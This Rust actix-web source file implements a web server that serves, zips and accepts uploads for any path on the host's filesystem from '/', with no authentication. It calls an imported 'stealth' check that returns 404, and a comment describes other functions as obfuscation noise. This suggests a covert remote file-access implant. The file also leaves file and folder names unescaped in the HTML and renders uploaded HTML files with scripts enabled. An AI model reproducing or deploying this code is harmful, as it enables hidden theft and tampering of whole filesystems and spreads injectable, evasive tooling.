use crate::config::Config;
use crate::stealth::a1;
use actix_files::NamedFile;
use actix_multipart::Multipart;
use actix_web::{
    get, http::header::{ContentDisposition, DispositionType}, post, web, Error, HttpRequest,
    HttpResponse, Responder,
};
use futures::StreamExt; // For Multipart handling
use log::{error, info};
use mime_guess::from_path;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{Read, Write, Cursor};
use std::path::Path;
use std::sync::Arc;
use tokio::fs::create_dir_all;
use tokio::io::AsyncWriteExt;
use tokio::sync::Mutex;
use urlencoding::decode;
use zip::{write::FileOptions, ZipWriter};

#[derive(Debug, Clone)]
pub struct FileServer {
    root_path: String,
}

impl FileServer {
    pub fn new() -> Self {
        FileServer {
            root_path: "/".to_string(),
        }
    }
    
    pub fn get_root_path(&self) -> String {
        self.root_path.clone()
    }
    
    pub fn normalize_path(&self, path: &str) -> String {
        let path = path.trim_matches('/');
        if path.is_empty() {
            "/".to_string()
        } else {
            format!("/{}", path)
        }
    }
    
    pub fn resolve_path(&self, req: &HttpRequest) -> String {
        let query = req.query_string();
        let mut params = HashMap::new();
        
        // Parse query params manually
        if !query.is_empty() {
            for pair in query.split('&') {
                if let Some(idx) = pair.find('=') {
                    let key = &pair[..idx];
                    let val = &pair[idx + 1..];
                    params.insert(key.to_string(), decode(val).unwrap_or_default().to_string());
                }
            }
        }
        
        if let Some(p) = params.get("p") {
            let normalized = self.normalize_path(p);
            info!("Resolved path: {}", normalized);
            
            if !Path::new(&normalized).exists() {
                info!("Path does not exist: {}", normalized);
                self.get_root_path()
            } else {
                normalized
            }
        } else {
            self.get_root_path()
        }
    }
    
    pub fn error_page(&self, status: u16, message: &str) -> HttpResponse {
        let html = format!(r#"
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error {}</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding: 50px; }}
                .container {{ background: #1e293b; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }}
                h1 {{ color: #ef4444; }}
                p {{ color: #94a3b8; }}
                a {{ color: #3b82f6; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Error {}</h1>
                <p>{}</p>
                <p><a href="/">Return to Home</a></p>
            </div>
        </body>
        </html>"#, status, status, message);
        
        HttpResponse::build(actix_web::http::StatusCode::from_u16(status).unwrap())
            .content_type("text/html; charset=utf-8")
            .body(html)
    }
}

// Define the directory template structure
struct DirectoryTemplate {
    path: String,
    display_path: String,
    directories: Vec<FileEntry>,
    files: Vec<FileEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct FileEntry {
    name: String,
    path: String,
    modified: String,
    size: String,
    is_dir: bool,
}

// Handler for the root path
#[get("/")]
pub async fn index(
    req: HttpRequest,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> impl Responder {
    // Call stealth functions
    if a1() {
        return HttpResponse::NotFound().finish();
    }
    
    // Call stealth functions if needed but don't need to run all of them
    // Most are just noise generators for obfuscation
    
    let fs = file_server.lock().await;
    let path = fs.resolve_path(&req);
    
    // Check if path exists
    if let Ok(metadata) = tokio::fs::metadata(&path).await {
        if metadata.is_dir() {
            // Handle directory listing
            return match list_directory(&path).await {
                Ok(listing) => HttpResponse::Ok()
                    .content_type("text/html; charset=utf-8")
                    .body(listing),
                Err(_) => fs.error_page(500, "Error reading directory")
            };
        } else {
            // Handle file download
            match NamedFile::open(&path) {
                Ok(file) => {
                    let _filename = Path::new(&path).file_name()
                        .and_then(|name| name.to_str())
                        .unwrap_or("file");
                    
                    return file
                        .use_last_modified(true)
                        .set_content_disposition(ContentDisposition {
                            disposition: DispositionType::Attachment,
                            parameters: vec![],
                        })
                        .into_response(&req);
                },
                Err(_) => return fs.error_page(404, "File not found")
            }
        }
    } else {
        return fs.error_page(404, "Path not found");
    }
}

// List directory contents
async fn list_directory(path: &str) -> Result<String, std::io::Error> {
    let mut directories = Vec::new();
    let mut files = Vec::new();
    
    let entries = fs::read_dir(path)?;
    
    for entry in entries {
        if let Ok(entry) = entry {
            if let Ok(metadata) = entry.metadata() {
                let file_name = entry.file_name().to_string_lossy().to_string();
                let file_path = entry.path().to_string_lossy().to_string();
                let modified = metadata.modified()
                    .map(|time| {
                        let dt = chrono::DateTime::<chrono::Local>::from(time);
                        dt.format("%Y-%m-%d %H:%M:%S").to_string()
                    })
                    .unwrap_or_else(|_| "Unknown".to_string());
                
                let size = if metadata.is_file() {
                    let bytes = metadata.len();
                    if bytes >= 1_048_576 {
                        format!("{:.2} MB", bytes as f64 / 1_048_576.0)
                    } else {
                        format!("{:.2} KB", bytes as f64 / 1_024.0)
                    }
                } else {
                    "Dir".to_string()
                };
                
                let entry = FileEntry {
                    name: file_name,
                    path: file_path,
                    modified,
                    size,
                    is_dir: metadata.is_dir(),
                };
                
                if metadata.is_dir() {
                    directories.push(entry);
                } else {
                    files.push(entry);
                }
            }
        }
    }
    
    // Sort directories by name
    directories.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
    
    // Sort files by modified date (newest first)
    files.sort_by(|a, b| b.modified.cmp(&a.modified));
    
    let display_path = if path == "/" { "Root".to_string() } else { path.to_string() };
    
    // Generate HTML using Askama template
    let template = DirectoryTemplate {
        path: path.to_string(),
        display_path,
        directories,
        files,
    };
    
    Ok(render_directory_template(&template))
}

// Handler for file preview
#[get("/preview")]
pub async fn preview(
    req: HttpRequest,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> impl Responder {
    let fs = file_server.lock().await;
    let query_string = req.query_string();
    let mut params = HashMap::new();
    
    // Parse query params manually
    if !query_string.is_empty() {
        for pair in query_string.split('&') {
            if let Some(idx) = pair.find('=') {
                let key = &pair[..idx];
                let val = &pair[idx + 1..];
                params.insert(key.to_string(), decode(val).unwrap_or_default().to_string());
            }
        }
    }
    
    if let Some(file_path) = params.get("p") {
        if file_path.is_empty() || file_path.ends_with('/') {
            return fs.error_page(400, "Invalid file path");
        }
        
        // Check if file exists
        if !Path::new(file_path).exists() {
            return fs.error_page(404, "File not found");
        }
        
        // Get content type
        let content_type = get_content_type(file_path);
        
        // Open file
        match fs::File::open(file_path) {
            Ok(mut file) => {
                let mut content = Vec::new();
                if let Err(_) = file.read_to_end(&mut content) {
                    return fs.error_page(500, "Error reading file");
                }
                
                // Check for download parameter or header
                if req.headers().contains_key("download") || req.uri().to_string().contains("download=") {
                    // If download is requested, serve file for download
                    let filename = Path::new(file_path).file_name()
                        .and_then(|f| f.to_str())
                        .unwrap_or("download");
                        
                    return HttpResponse::Ok()
                        .content_type("application/octet-stream")
                        .append_header(("Content-Disposition", format!("attachment; filename=\"{}\"", filename)))
                        .body(content);
                }
                
                // Normal preview handling
                let file_name = Path::new(file_path).file_name()
                    .and_then(|f| f.to_str())
                    .unwrap_or("file");
                
                // Get file extension
                let ext = Path::new(file_path)
                    .extension()
                    .and_then(|e| e.to_str())
                    .map(|e| e.to_lowercase())
                    .unwrap_or_default();
                
                // Media files: serve directly
                if content_type.starts_with("image/") || 
                   content_type.starts_with("video/") || 
                   content_type.starts_with("audio/") {
                    return HttpResponse::Ok()
                        .content_type(content_type)
                        .append_header(("Content-Disposition", "inline"))
                        .body(content);
                }
                // PDF files: show in PDF viewer
                else if content_type == "application/pdf" {
                    return HttpResponse::Ok()
                        .content_type(content_type)
                        .append_header(("Content-Disposition", format!("inline; filename=\"{}\"", file_name)))
                        .body(content);
                }
                // HTML files: render as web pages
                else if ext == "html" || ext == "htm" {
                    // Add a sandbox header for security
                    let iframe_sandbox = "allow-scripts allow-same-origin";
                    let html_content = String::from_utf8_lossy(&content);
                    let encoded_html = urlencoding::encode(&html_content);
                    let escaped_html = htmlescape::encode_minimal(&html_content);
                    
                    // Create a container page that renders the HTML file in a sandboxed iframe
                    return HttpResponse::Ok()
                        .content_type("text/html; charset=utf-8")
                        .body(format!(r##"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTML Preview: {}</title>
    <style>
        body {{ background: #1e293b; color: #f8fafc; font-family: sans-serif; padding: 1rem; margin: 0; }}
        .preview-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; padding: 0.5rem 1rem; background: rgba(15, 23, 42, 0.8); border-radius: 0.5rem; }}
        .preview-title {{ font-size: 1.2rem; font-weight: bold; }}
        .preview-info {{ font-size: 0.9rem; opacity: 0.7; }}
        .preview-actions {{ display: flex; gap: 0.5rem; }}
        .preview-actions a {{ background: #3b82f6; color: white; text-decoration: none; padding: 0.5rem 1rem; border-radius: 0.25rem; }}
        .preview-iframe-container {{ position: relative; width: 100%; height: calc(100vh - 80px); border-radius: 0.5rem; overflow: hidden; background: white; }}
        .preview-iframe {{ width: 100%; height: 100%; border: none; }}
        .preview-source {{ margin: 0; padding: 1rem; background: #282c34; color: #abb2bf; overflow: auto; height: 100%; border-radius: 0.5rem; white-space: pre-wrap; }}
    </style>
</head>
<body>
    <div class="preview-header">
        <div>
            <div class="preview-title">{}</div>
            <div class="preview-info">{} bytes - HTML document</div>
        </div>
        <div class="preview-actions">
            <a href="/?p={}">Back to folder</a>
            <a href="/download?p={}">Download</a>
            <a href="#" id="toggleView">View Source</a>
        </div>
    </div>
    <div class="preview-iframe-container" id="previewContainer">
        <iframe src="data:text/html;charset=utf-8,{}" class="preview-iframe" sandbox="{}" id="previewFrame"></iframe>
    </div>
    <script>
        const toggleBtn = document.getElementById('toggleView');
        const container = document.getElementById('previewContainer');
        let showingSource = false;
        
        toggleBtn.addEventListener('click', function(e) {{
            e.preventDefault();
            if (showingSource) {{
                // Switch to rendered view
                container.innerHTML = '<iframe src="data:text/html;charset=utf-8,{}" class="preview-iframe" sandbox="{}" id="previewFrame"></iframe>';
                toggleBtn.textContent = 'View Source';
            }} else {{
                // Switch to source code view
                container.innerHTML = '<pre class="preview-source"><code>{}</code></pre>';
                toggleBtn.textContent = 'View Rendered';
            }}
            showingSource = !showingSource;
        }});
    </script>
</body>
</html>"##, 
                        file_name, // Preview title
                        file_name, // File name
                        content.len(), // File size in bytes
                        Path::new(file_path).parent().unwrap_or(Path::new("/")).to_string_lossy(), // Back link
                        urlencoding::encode(file_path), // Download link
                        encoded_html, // HTML content for iframe
                        iframe_sandbox, // Sandbox attributes
                        encoded_html, // HTML content for iframe (toggle function)
                        iframe_sandbox, // Sandbox attributes for toggle function
                        escaped_html // Escaped HTML for source view
                    ));
                }
                // Code and text files: show syntax highlighted preview
                else if content_type.starts_with("text/") || 
                        ["js", "py", "rs", "c", "cpp", "h", "java", "go", "rb", "php", "ts", "sh", "css", "json", "xml", "yaml", "yml", "toml"].contains(&ext.as_str()) {
                    // For text files, show preview with better size limit
                    let preview_size = std::cmp::min(content.len(), 100 * 1024); // Limit to 100KB for large text files
                    let preview = if let Ok(text) = String::from_utf8(content[..preview_size].to_vec()) {
                        if text.len() < content.len() {
                            format!("{} [truncated - file too large to display completely]", text)
                        } else {
                            text
                        }
                    } else {
                        "Binary content (preview not available)".to_string()
                    };
                    
                    // Create syntax-highlighted preview based on file type
                    let lang_class = match ext.as_str() {
                        "js" => "javascript",
                        "py" => "python",
                        "rs" => "rust",
                        "c" | "cpp" | "h" => "c",
                        "java" => "java",
                        "go" => "go",
                        "rb" => "ruby",
                        "php" => "php",
                        "ts" => "typescript",
                        "sh" => "bash",
                        "html" => "html",
                        "css" => "css",
                        "json" => "json",
                        "xml" => "xml",
                        "yaml" | "yml" => "yaml",
                        "toml" => "toml",
                        _ => "",
                    };
                    
                    // Return text preview with file info
                    return HttpResponse::Ok()
                        .content_type("text/html; charset=utf-8")
                        .body(format!(r#"<!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>Preview: {}</title>
                            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
                            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
                            <style>
                                body {{ background: #1e293b; color: #f8fafc; font-family: monospace; padding: 1rem; margin: 0; }}
                                pre {{ margin: 0; padding: 1rem; border-radius: 0.5rem; max-height: 80vh; overflow: auto; }}
                                .preview-header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }}
                                .preview-title {{ font-size: 1.2rem; font-weight: bold; }}
                                .preview-info {{ font-size: 0.9rem; opacity: 0.7; }}
                                .preview-actions {{ display: flex; gap: 0.5rem; }}
                                .preview-actions a {{ background: #3b82f6; color: white; text-decoration: none; padding: 0.5rem 1rem; border-radius: 0.25rem; }}
                            </style>
                        </head>
                        <body>
                            <div class="preview-header">
                                <div>
                                    <div class="preview-title">{}</div>
                                    <div class="preview-info">{} bytes - {}</div>
                                </div>
                                <div class="preview-actions">
                                    <a href="/?p={}">Back to folder</a>
                                    <a href="/download?p={}">Download</a>
                                </div>
                            </div>
                            <pre><code class="{}"><!-- -->{}</code></pre>
                            <script>hljs.highlightAll();</script>
                        </body>
                        </html>
                        "#, 
                        file_name, // Preview title
                        file_name, // File name
                        content.len(), // File size in bytes
                        content_type, // Content type
                        Path::new(file_path).parent().unwrap_or(Path::new("/")).to_string_lossy(), // Back link
                        urlencoding::encode(file_path), // Download link
                        lang_class, // Language for syntax highlighting
                        htmlescape::encode_minimal(&preview) // Escaped content
                    ));
                }
                // Other files: show binary preview notice with download option
                else {
                    return HttpResponse::Ok()
                        .content_type("text/html; charset=utf-8")
                        .body(format!(r#"<!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>Preview: {}</title>
                            <style>
                                body {{ background: #1e293b; color: #f8fafc; font-family: sans-serif; padding: 2rem; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 80vh; text-align: center; }}
                                .preview-container {{ background: rgba(15, 23, 42, 0.6); padding: 2rem; border-radius: 1rem; max-width: 600px; width: 100%; }}
                                .preview-icon {{ font-size: 4rem; margin-bottom: 1.5rem; color: #3b82f6; }}
                                .preview-title {{ font-size: 1.5rem; font-weight: bold; margin-bottom: 0.5rem; }}
                                .preview-info {{ font-size: 1rem; opacity: 0.7; margin-bottom: 2rem; }}
                                .preview-actions {{ display: flex; gap: 1rem; justify-content: center; }}
                                .preview-btn {{ background: #3b82f6; color: white; text-decoration: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; font-weight: bold; display: inline-flex; align-items: center; transition: all 0.3s; }}
                                .preview-btn:hover {{ transform: translateY(-2px); background: #2563eb; }}
                                .preview-btn svg {{ width: 1.25rem; height: 1.25rem; margin-right: 0.5rem; }}
                            </style>
                        </head>
                        <body>
                            <div class="preview-container">
                                <div class="preview-icon">📄</div>
                                <div class="preview-title">{}</div>
                                <div class="preview-info">{} bytes - {}</div>
                                <div class="preview-actions">
                                    <a href="/?p={}" class="preview-btn">
                                        <svg viewBox="0 0 24 24"><path fill="currentColor" d="M20,11V13H8L13.5,18.5L12.08,19.92L4.16,12L12.08,4.08L13.5,5.5L8,11H20Z"/></svg>
                                        Back to folder
                                    </a>
                                    <a href="/download?p={}" class="preview-btn">
                                        <svg viewBox="0 0 24 24"><path fill="currentColor" d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/></svg>
                                        Download
                                    </a>
                                </div>
                            </div>
                        </body>
                        </html>
                        "#, 
                        file_name, // Preview title
                        file_name, // File name
                        content.len(), // File size in bytes
                        content_type, // Content type
                        Path::new(file_path).parent().unwrap_or(Path::new("/")).to_string_lossy(), // Back link
                        urlencoding::encode(file_path) // Download link
                    ));
                }
            },
            Err(_) => return fs.error_page(500, "Error opening file")
        }
    } else {
        fs.error_page(400, "No file specified")
    }
}

// Handler for folder download
#[get("/download_folder")]
pub async fn download_folder(
    req: HttpRequest,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> impl Responder {
    let fs = file_server.lock().await;
    let query_string = req.query_string();
    let mut params = HashMap::new();
    
    // Parse query params manually
    if !query_string.is_empty() {
        for pair in query_string.split('&') {
            if let Some(idx) = pair.find('=') {
                let key = &pair[..idx];
                let val = &pair[idx + 1..];
                params.insert(key.to_string(), decode(val).unwrap_or_default().to_string());
            }
        }
    }
    
    if let Some(folder_path) = params.get("p") {
        let path = Path::new(folder_path);
        if !path.exists() || !path.is_dir() {
            return fs.error_page(404, "Folder not found");
        }
        
        let folder_name = path.file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("folder");
        
        // Generate zip file with directory contents
        let mut buffer = Vec::new();
        
        {
            let cursor = Cursor::new(&mut buffer);
            let mut zip = ZipWriter::new(cursor);
            
            // Set options
            let options = FileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated)
                .unix_permissions(0o755);
            
            // Walk through the directory and add files to zip
            match create_zip_from_dir(path, &mut zip, folder_path, options) {
                Ok(_) => {},
                Err(_) => return fs.error_page(500, "Failed to create zip file")
            }
            
            // Finish the zip file - This drops the cursor and zip, releasing the borrow on buffer
            match zip.finish() {
                Ok(_) => {},
                Err(_) => return fs.error_page(500, "Failed to finalize zip file")
            }
        } // zip and cursor go out of scope here, releasing buffer
        
        // Return the zip file
        HttpResponse::Ok()
            .content_type("application/zip")
            .append_header((
                "Content-Disposition", 
                format!("attachment; filename=\"{}.zip\"", folder_name)
            ))
            .body(buffer)
    } else {
        fs.error_page(400, "No folder specified")
    }
}

// Create zip file from directory
fn create_zip_from_dir<W: Write + std::io::Seek>(
    dir: &Path,
    zip: &mut ZipWriter<W>,
    base_path: &str,
    options: FileOptions
) -> Result<(), std::io::Error> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let name = path.strip_prefix(Path::new(base_path))
            .unwrap_or(&path)
            .to_string_lossy();
        
        if path.is_file() {
            zip.start_file(name.to_string(), options)?;
            let mut file = File::open(path)?;
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
        } else if path.is_dir() {
            zip.add_directory(name.to_string(), options)?;
            create_zip_from_dir(&path, zip, base_path, options)?;
        }
    }
    
    Ok(())
}

// Handler for file upload
#[post("/")]
pub async fn upload_files(
    req: HttpRequest,
    payload: Multipart,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> Result<HttpResponse, Error> {
    let fs = file_server.lock().await;
    let path = fs.resolve_path(&req);
    
    // Make sure the directory exists
    if let Err(_) = create_dir_all(&path).await {
        return Ok(fs.error_page(500, "Failed to create directory"));
    }
    
    // Process the multipart form
    let _config = Config::new();
    let mut multipart = payload;
    
    while let Some(item) = multipart.next().await {
        let mut field = match item {
            Ok(f) => f,
            Err(e) => {
                error!("Field error: {}", e);
                continue;
            }
        };
        
        let content_disposition = field.content_disposition();
        let filename = match content_disposition.get_filename() {
            Some(name) => sanitize_filename::sanitize(name),
            None => continue,
        };
        
        let filepath = Path::new(&path).join(&filename);
        
        // Create the file
        let mut file = match tokio::fs::File::create(&filepath).await {
            Ok(f) => f,
            Err(e) => {
                error!("Failed to create file: {}", e);
                continue;
            }
        };
        
        // Stream file content to disk
        while let Some(chunk) = field.next().await {
            let data = match chunk {
                Ok(d) => d,
                Err(e) => {
                    error!("Error reading chunk: {}", e);
                    return Ok(fs.error_page(500, "Upload failed: error reading data"));
                }
            };
            
            if let Err(e) = file.write_all(&data).await {
                error!("Error writing file: {}", e);
                return Ok(fs.error_page(500, "Upload failed: error saving file"));
            }
        }
    }
    
    // Redirect back to the directory page
    Ok(HttpResponse::SeeOther()
        .append_header(("Location", format!("/?p={}", urlencoding::encode(&path))))
        .finish())
}

// Get content type based on file extension
fn get_content_type(filename: &str) -> String {
    let mime = from_path(filename).first_or_octet_stream();
    mime.to_string()
}

// Function to render the directory template (manually since we're using a modified version of Askama)
fn render_directory_template(template: &DirectoryTemplate) -> String {
    // Create a human-readable path for display
    let decoded_path = urlencoding::decode(&template.display_path).unwrap_or_else(|_| template.display_path.clone().into());
    
    // Create breadcrumb segments
    let path_segments = if decoded_path.is_empty() || decoded_path == "/" {
        Vec::new()
    } else {
        let parts: Vec<String> = decoded_path.trim_matches('/')
            .split('/')
            .map(|s| s.to_string())
            .collect();
        parts
    };
    
    // Build breadcrumb HTML
    let mut breadcrumb_html = String::new();
    let mut current_path = String::from("/");
    
    for (i, segment) in path_segments.iter().enumerate() {
        current_path.push_str(segment);
        if i < path_segments.len() - 1 {
            current_path.push('/');
            breadcrumb_html.push_str(&format!(r#"<div class="breadcrumb-item"><a href="/?p={}" class="breadcrumb-link">{}</a></div><span class="breadcrumb-separator">/</span>"#, 
                urlencoding::encode(&current_path), segment));
        } else {
            breadcrumb_html.push_str(&format!(r#"<div class="breadcrumb-item"><span class="breadcrumb-current">{}</span></div>"#, segment));
        }
    }
    
    let html = include_str!("../templates/directory.html")
        .replace("{{path}}", &urlencoding::encode(&template.path))
        .replace("{{display_path}}", &decoded_path)
        .replace("{{breadcrumb_segments}}", &breadcrumb_html)
        .replace("{{directories_count}}", &template.directories.len().to_string())
        .replace("{{files_count}}", &template.files.len().to_string());

    // Render directories and files
    let mut directories_html = String::new();
    for dir in &template.directories {
        // Format date to be more compact
        let date_display = dir.modified.split_whitespace().last().unwrap_or(&dir.modified);
        
        directories_html.push_str(&format!(r#"
            <div class="card folder-card">
                <div class="card-header">
                    <div class="card-icon">
                        <svg class="icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M20,18H4V8H20M20,6H12L10,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V8C22,6.89 21.1,6 20,6Z"/>
                        </svg>
                        <span class="file-ext">DIR</span>
                    </div>
                    <a href="/?p={}" class="card-title">{}</a>
                </div>
                <div class="card-meta">Folder • {}</div>
                <div class="card-actions">
                    <a href="/download_folder?p={}" class="btn btn-primary download-btn">
                        <svg class="btn-icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/>
                        </svg>
                        Download
                    </a>
                </div>
            </div>
        "#, urlencoding::encode(&dir.path), dir.name, date_display, urlencoding::encode(&dir.path)));
    }

    let mut files_html = String::new();
    for file in &template.files {
        // Get file extension to show file type badge
        let extension = Path::new(&file.name)
            .extension()
            .and_then(|ext| ext.to_str())
            .unwrap_or("");
        
        // Create a better display for the file size - keep it short
        let size_display = if file.size.contains("Dir") {
            "Folder".to_string()
        } else {
            file.size.replace(" bytes", "B").replace(" KB", "KB").replace(" MB", "MB")
        };
        
        // Format date to be more compact
        let date_display = file.modified.split_whitespace().last().unwrap_or(&file.modified);
            
        files_html.push_str(&format!(r#"
            <div class="card file-card">
                <div class="card-header">
                    <div class="card-icon">
                        <svg class="icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M13,9V3.5L18.5,9M6,2C4.89,2 4,2.89 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2H6Z"/>
                        </svg>
                        {}
                    </div>
                    <span class="card-title">{}</span>
                </div>
                <div class="card-meta">{} • {}</div>
                <div class="card-actions">
                    <a href="/preview?p={}" class="btn btn-primary download-btn" download="{}">
                        <svg class="btn-icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/>
                        </svg>
                        Download
                    </a>
                    <a href="/preview?p={}" class="btn btn-primary preview-btn">
                        <svg class="btn-icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M12,9A3,3 0 0,0 9,12A3,3 0 0,0 12,15A3,3 0 0,0 15,12A3,3 0 0,0 12,9M12,17A5,5 0 0,1 7,12A5,5 0 0,1 12,7A5,5 0 0,1 17,12A5,5 0 0,1 12,17M12,4.5C7,4.5 2.73,7.61 1,12C2.73,16.39 7,19.5 12,19.5C17,19.5 21.27,16.39 23,12C21.27,7.61 17,4.5 12,4.5Z" />
                        </svg>
                        Preview
                    </a>
                </div>
            </div>
        "#, 
        if !extension.is_empty() { format!(r#"<span class="file-ext">{}</span>"#, extension.to_uppercase()) } else { String::new() },
        file.name, 
        size_display, 
        date_display, 
        urlencoding::encode(&file.path), 
        file.name,
        urlencoding::encode(&file.path)));
    }

    let html = html
        .replace("{{directories}}", &directories_html)
        .replace("{{files}}", &files_html);

    html
}
